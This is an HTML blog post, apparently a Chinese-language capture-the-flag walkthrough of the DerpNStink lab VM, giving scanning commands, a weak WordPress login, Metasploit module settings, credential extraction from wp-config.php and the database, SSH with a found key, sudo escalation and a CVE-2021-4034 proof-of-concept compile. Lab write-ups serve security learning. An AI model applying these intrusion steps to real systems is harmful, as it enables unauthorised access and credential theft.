@@ -1,0 +1,146 @@
+<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta property="og:site_name" content="My Blog"><meta property="og:type" content="article"><meta property="og:image" content="http://localhost:63170/img/home-bg-jeep.jpg"><meta property="twitter:image" content="http://localhost:63170/img/home-bg-jeep.jpg"><meta name=title content="DC1"><meta property="og:title" content="DC1"><meta property="twitter:title" content="DC1"><meta name=description content><meta property="og:description" content><meta property="twitter:description" content><meta property="twitter:card" content="summary"><meta name=keyword content><link rel="shortcut icon" href=/img/favicon.ico><title>DC1 | 帅蛋的博客 | Shuai dan Blog</title>
+<link rel=canonical href=/post/dfgrtujhygt/><link rel=stylesheet href=/css/bootstrap.min.css><link rel=stylesheet href=/css/hugo-theme-cleanwhite.min.css><link rel=stylesheet href=/css/zanshang.css><link rel=stylesheet href=/css/font-awesome.all.min.css><script src=/js/jquery.min.js></script><script src=/js/bootstrap.min.js></script><script src=/js/hux-blog.min.js></script><script src=/js/lazysizes.min.js></script></head><nav class="navbar navbar-default navbar-custom navbar-fixed-top"><div class=container-fluid><div class="navbar-header page-scroll"><button type=button class=navbar-toggle>
+<span class=sr-only>Toggle navigation</span>
+<span class=icon-bar></span>
+<span class=icon-bar></span>
+<span class=icon-bar></span>
+</button>
+<a class=navbar-brand href=/>My Blog</a></div><div id=huxblog_navbar><div class=navbar-collapse><ul class="nav navbar-nav navbar-right"><li><a href=/>All Posts</a></li><li><a href=/categories/life/>life</a></li><li><a href=/categories/tech/>tech</a></li><li><a href=/categories/tips/>tips</a></li><li><a href=/archive//>档案</a></li><li><a href=/notes//>笔记</a></li><li><a href=/about//>关于</a></li><li><a href=/search><i class="fa fa-search"></i></a></li></ul></div></div></div></nav><script>var $body=document.body,$toggle=document.querySelector(".navbar-toggle"),$navbar=document.querySelector("#huxblog_navbar"),$collapse=document.querySelector(".navbar-collapse");$toggle.addEventListener("click",handleMagic);function handleMagic(){$navbar.className.indexOf("in")>0?($navbar.className=" ",setTimeout(function(){$navbar.className.indexOf("in")<0&&($collapse.style.height="0px")},400)):($collapse.style.height="auto",$navbar.className+=" in")}</script><style type=text/css>header.intro-header{background-image:url(/img/home-bg-jeep.jpg)}</style><header class=intro-header><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><div class=post-heading><div class=tags></div><h1>DC1</h1><h2 class=subheading>How to set up this theme</h2><span class=meta>Posted by
+帅蛋
+on
+Tuesday, January 9, 2024</span></div></div></div></div></header><article><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2
+col-md-10 col-md-offset-1
+post-container"><h4 id=1扫描端口以及ip>1）扫描端口以及ip</h4><p>首先对当前网段进行一个快速扫描</p><pre tabindex=0><code>nmap -sS 192.168.213.0/24
+</code></pre><p><img src=img/20231231093904.png alt=image.png>
+在对靶机IP进行一个详细扫描</p><pre tabindex=0><code>nmap -sV -p- 192.168.213.138
+</code></pre><p><img src=img/20231231094023.png alt=image.png>
+可对当前信息做一个搜集和记录</p><h4 id=2对网页进行一个信息搜集>2）对网页进行一个信息搜集</h4><p><img src=img/20231231094159.png alt=image.png|425>
+这里看到一个网络笔记信息对他进行一个访问
+<img src=img/20231231094322.png alt=image.png|475>
+意思是要我们更新本地的dns服务，才能访问博客！
+<strong>windows host文件存放位置:</strong>
+<code>C:\Windows\System32\drivers\etc\hosts</code>
+请注意，这是一个系统文件，因此您可能需要管理员权限才能编辑它。如果您尝试修改 <code>hosts</code> 文件，请确保以管理员身份运行文本编辑器，否则您可能无法保存更改。
+<strong>方法</strong>：管理员身份运行cmd,输入<code>notepad</code>回车,在记事本里直接点击文件-打开，选择路径:<code>C:\Windows\System32\drivers\etc</code>，继续选择所有文件，然后打开hosts文件,最后添加<code>ctrl+s</code>保存即可
+<strong>Linux host文件存放位置:</strong>
+在 Linux 系统中，<code>/etc/hosts</code> 文件用于将主机名映射到 IP 地址。这个文件允许您在不使用 DNS 的情况下执行本地主机名解析。
+<img src=img/20231231094653.png alt=image.png|425>
+<code>192.168.213.138 derpnstink.local</code>
+尝试通过浏览器访问这个本地域名。在浏览器中输入 <code>http://derpnstink.local/</code> 并按下 Enter 键，看看是否能够访问相应的服务或页面。
+<img src=img/20231231100130.png alt=image.png|450>
+发现flag1进行一个信息记录
+&lt;&ndash;flag1(52E37291AEDF6A46D7D0BB8A6312F4F9F1AA4975C248C3F0E008CBA09D6E9166) &ndash;> <a href=https://www.somd5.com/>MD5在线解密</a>
+<img src=img/20231231100519.png alt=image.png|450>
+澳大利亚的意思</p><h4 id=2扫描敏感目录>2）扫描敏感目录</h4><pre tabindex=0><code>dirb http://derpnstink.local/
+</code></pre><p><img src=img/20231231102959.png alt=image.png>
+找的wordpress站！
+<img src=img/20231231110006.png alt=image.png>
+<img src=img/20231231110916.png alt=image.png|525>
+可以对这个进行一个密码爆破
+发现他是弱账号密码：<code>admin/admin</code>
+<img src=img/20231231121641.png alt=|425>
+phpMyAdmin登录页面
+<strong>phpMyAdmin</strong> 是一个用于管理 MySQL 数据库的免费、开源的Web应用程序。它提供了一个直观的用户界面，通过Web浏览器，用户可以轻松地执行数据库管理任务，如创建、删除和修改数据库，执行 SQL 查询，管理用户权限等。
+<img src=img/20231231110551.png alt=image.png|450></p><h4 id=3awvs进行扫描>3）awvs进行扫描</h4><p>对wordpreess站进行扫描看有没有什么漏洞</p><pre tabindex=0><code>http://derpnstink.local/weblog/
+</code></pre><p><img src=img/20231231105909.png alt=image.png|450>
+发现有一个<code>Slideshow Gallery</code>这个漏洞
+<img src=img/20231231111153.png alt=image.png|450></p><h4 id=4msf利用>4）msf利用</h4><ol><li>进入<code>msfconsole</code></li><li>查找<code>slideshow gallery</code>漏洞：</li></ol><pre tabindex=0><code>	search slideshow gallery
+</code></pre><p><img src=img/20231231112209.png alt=image.png|425></p><ol start=3><li><code>use 0</code> 选择这个模块</li><li><code>show options</code> 看他需要配置哪些信息</li><li><code>set Rhosts 192.168.213.133</code></li><li><code>set targeturi /weblog</code>
+用于指定目标系统上要执行渗透测试的特定 Web 目录路径。</li><li><code>set wp_password admin</code></li><li><code>set wp_user admin</code></li><li><code>run</code></li></ol><h4 id=5获得shell>5）获得shell</h4><p><img src=img/20231231124354.png alt=image.png>
+<code>shell</code>
+<code>python -c 'import pty; pty.spawn("/bin/bash")'</code></p><ul><li>回到/var/www/html/weblog查看信息
+<img src=img/20231231125338.png alt=image.png|375></li><li>发现wp-config.php文件，应该是个配置文件，cat查看一下</li><li>获取到mysql账号密码
+cat wp-config.php
+<img src=img/20231231125504.png alt=image.png|450>
+mysql账号密码获得：
+root
+mysql
+登陆MySQL
+mysql -u root -p
+查看有哪些库：
+<img src=img/20231231133759.png alt=image.png|450>
+进入use wordpress;
+查看这个数据库有哪些表:show tables;
+<img src=img/20231231133930.png alt=image.png|325>
+查看表内容:<code>select * from wp_users \G</code>;
+<img src=img/20231231134104.png alt=image.png|325>
+对此密码进行爆破:新建一个txt文本将密码复制进去
+<img src=img/20231231134758.png alt=image.png|475>
+得到密码:<code>wedgie57</code>
+登陆unclestinky得到flag2
+<img src=img/20231231150945.png alt=image.png|425>
+<img src=img/20231231151056.png alt=image.png|425>
+flag2(a7d355b26bda6bf1196ccffead0b2cf2b81f0a9de5b4876b44407f1dc07e51e6)
+<a href=https://www.somd5.com/>MD5在线解密</a>
+<img src=img/20231231151303.png alt=image.png|500>
+意思为墨西哥
+回到home目录下发现两个用户名：
+<img src=img/20231231135234.png alt=image.png|475>
+上面做了信息收集他开起了ftp和ssh端口尝试用刚才的密码进行这两个登陆
+发现ftp用stinky可以登录并发现一个key.txt的文本文件
+<img src=img/20231231135504.png alt=image.png|400>
+提供了一个RSA私钥
+<img src=img/20231231144414.png alt=image.png|300>
+进行ssh登陆：</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-r data-lang=r><span style=display:flex><span>将使用密钥登录，将密钥文件key.txt权限设置为700
+</span></span><span style=display:flex><span>chmod <span style=color:#bd93f9>700</span> key.txt
+</span></span><span style=display:flex><span>	<span style=color:#6272a4>#它将文件 `key.txt` 的权限设置为只有文件所有者有读、写、执行的权限，而其他用户没有任何权限。</span>
+</span></span><span style=display:flex><span>ssh <span style=color:#ff79c6>-</span>i key.txt stinky<span style=color:#ff79c6>@</span><span style=color:#bd93f9>192.168.213.138</span> <span style=color:#ff79c6>-</span>o PubkeyAcceptedKeyTypes<span style=color:#ff79c6>=+</span>ssh<span style=color:#ff79c6>-</span>rsa
+</span></span><span style=display:flex><span>	`-i key.txt`<span style=color:#ff79c6>:</span> 指定要使用的私钥文件。在这里，`key.txt` 应该是你的私钥文件。
+</span></span><span style=display:flex><span>	`-o PubkeyAcceptedKeyTypes=+ssh-rsa`<span style=color:#ff79c6>:</span> 这个选项用于指定接受的公钥算法类型。在这里，`+ssh-rsa` 表示接受 SSH<span style=color:#ff79c6>-</span>RSA 算法的公钥。这是为了明确指定使用 RSA 算法的公钥进行身份验证。
+</span></span></code></pre></div><p><img src=img/20231231151738.png alt=image.png>
+找到flag3
+flag3(07f62b021771d3cf67e2e1faf18769cc5e5c119ad7d4d1847a11e11d6d5a7ecb)
+<a href=https://www.somd5.com/>MD5在线解密</a>
+<img src=img/20231231151843.png alt=image.png|475>
+巴西
+然后我们去找一下那个流量包，在Documents目录下发现derpissues.pcap
+你提到了一个名为 &ldquo;derpissues.pcap&rdquo; 的文件，文件扩展名 <code>.pcap</code> 通常表示数据包捕获文件。这类文件通常是使用网络监控工具（如Wireshark或tcpdump）生成的，包含捕获的网络流量。
+开启python3让kali下载下这个流量文件包
+python3 -m http.server 6666
+kali下载：
+wget 192.168.213.138:6666/derpissues.pcap
+打开wireshark对这个流量包进行分析
+过滤http协议
+<img src=img/20231231144851.png alt=image.png|400>
+找到他修改的另一个用户名和密码
+mrderp
+derpderpderpderpderpderpderp
+<img src=img/20231231142917.png alt=image.png|400></p><h4 id=6提权>6）提权</h4><p>ssh登陆mrderp用户
+ssh <a href=mailto:mrderp@192.168.213.138>mrderp@192.168.213.138</a>
+发现sudo可以提权
+<img src=img/20231231145204.png alt=image.png>
+cd /home/mrderp/binaries
+<img src=img/20231231145258.png alt=image.png>
+执行这个文件：sudo ./derpy.sh
+<img src=img/20231231145342.png alt=image.png>
+cd /root/Desktop下flag4
+<img src=img/20231231154852.png alt=image.png></p><p>另一种提权直接在stinky用户下
+cve-2021-4034
+<a href=https://github.com/arthepsy/CVE-2021-4034/blob/main/cve-2021-4034-poc.c>https://github.com/arthepsy/CVE-2021-4034/blob/main/cve-2021-4034-poc.c</a>
+<img src=img/20231231153824.png alt=image.png|400>
+下载到kali上，用python3 -m http.server 80下载在对他进行编译
+<code>gcc cve-2021-4034-poc.c -o dayu</code>
+使用 GCC 编译一个名为 <code>cve-2021-4034-poc.c</code> 的源代码文件，并将输出的可执行文件命名为 <code>dayu</code>。这种编译的命令通常是用来构建漏洞利用或漏洞验证代码的可执行文件。
+<code>chmod +x dayu</code>
+添加可执行权限给名为 <code>dayu</code> 的文件。通过执行这个命令，你允许文件 <code>dayu</code> 被作为一个可执行文件运行。
+<code>./dayu</code>
+执行名为 <code>dayu</code> 的可执行文件</p><hr><ul class=pager><li class=previous><a href=/post/shuaidan/ data-toggle=tooltip data-placement=top title="hello shuaidan">&larr;
+Previous Post</a></li></ul></div><div class="col-lg-2 col-lg-offset-0
+visible-lg-block
+sidebar-container
+catalog-container"><div class=side-catalog><hr class="hidden-sm hidden-xs"><h5><a class=catalog-toggle href=#>CATALOG</a></h5><ul class=catalog-body></ul></div></div><div class="col-lg-8 col-lg-offset-2
+col-md-10 col-md-offset-1
+sidebar-container"><section><hr class="hidden-sm hidden-xs"><h5><a href=/tags/>FEATURED TAGS</a></h5><div class=tags><a href=/tags/docker title=docker>docker
+</a><a href=/tags/istio title=istio>istio
+</a><a href=/tags/kubernetes title=kubernetes>kubernetes
+</a><a href=/tags/microservice title=microservice>microservice
+</a><a href=/tags/security title=security>security
+</a><a href=/tags/service-mesh title=service-mesh>service-mesh
+</a><a href=/tags/tips title=tips>tips</a></div></section><section><hr><h5>FRIENDS</h5><ul class=list-inline><li><a target=_blank href=https://inecho.cc>Jia Lun的博客</a></li><li><a target=_blank href=https://inecho.cc>哈哈哈哈哈哈哈哈</a></li></ul></section></div></div></div></article><footer><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><ul class="list-inline text-center"><li><a href=mailto:shuaidan0@gmail.com><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
+<i class="fas fa-envelope fa-stack-1x fa-inverse"></i></span></a></li><li><a href=full%20profile%20url%20in%20twitter><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
+<i class="fab fa-twitter fa-stack-1x fa-inverse"></i></span></a></li><li><a target=_blank href=https://images.cnblogs.com/cnblogs_com/blogs/815100/galleries/2372332/o_240204051144_QR_code.jpg><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
+<i class="fab fa-weixin fa-stack-1x fa-inverse"></i></span></a></li><li><a target=_blank href=https://github.com/yourgithub><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
+<i class="fab fa-github fa-stack-1x fa-inverse"></i></span></a></li><li><a target=_blank href=full%20profile%20url%20in%20instagram><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
+<i class="fab fa-instagram fa-stack-1x fa-inverse"></i></span></a></li><li><a href rel=alternate type=application/rss+xml title="My Blog"><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
+<i class="fas fa-rss fa-stack-1x fa-inverse"></i></span></a></li></ul><p class="copyright text-muted">Copyright &copy; My Blog 2024<br><a href=https://themes.gohugo.io/hugo-theme-cleanwhite>CleanWhite Hugo Theme</a> by <a href=https://zhaohuabing.com>Huabing</a> |
+<iframe style=margin-left:2px;margin-bottom:-5px frameborder=0 scrolling=0 width=100px height=20px src="https://ghbtns.com/github-btn.html?user=zhaohuabing&repo=hugo-theme-cleanwhite&type=star&count=true"></iframe></p></div></div></div></footer><script>function loadAsync(e,t){var s=document,o="script",n=s.createElement(o),i=s.getElementsByTagName(o)[0];n.src=e,t&&n.addEventListener("load",function(e){t(null,e)},!1),i.parentNode.insertBefore(n,i)}</script><script>$("#tag_cloud").length!==0&&loadAsync("/js/jquery.tagcloud.js",function(){$.fn.tagcloud.defaults={color:{start:"#bbbbee",end:"#0085a1"}},$("#tag_cloud a").tagcloud()})</script><script>loadAsync("https://cdn.jsdelivr.net/npm/fastclick@1.0.6/lib/fastclick.min.js",function(){var e=document.querySelector("nav");e&&FastClick.attach(e)})</script><script type=text/javascript>function generateCatalog(e){_containerSelector="div.post-container";var t,n,s,o,i,a=$(_containerSelector),r=a.find("h1,h2,h3,h4,h5,h6");return $(e).html(""),r.each(function(){t=$(this).prop("tagName").toLowerCase(),o="#"+$(this).prop("id"),n=$(this).text(),i=$('<a href="'+o+'" rel="nofollow">'+n+"</a>"),s=$('<li class="'+t+'_nav"></li>').append(i),$(e).append(s)}),!0}generateCatalog(".catalog-body"),$(".catalog-toggle").click(function(e){e.preventDefault(),$(".side-catalog").toggleClass("fold")}),loadAsync("/js/jquery.nav.js",function(){$(".catalog-body").onePageNav({currentClass:"active",changeHash:!1,easing:"swing",filter:"",scrollSpeed:700,scrollOffset:0,scrollThreshold:.2,begin:null,end:null,scrollChange:null,padding:80})})</script></body></html>
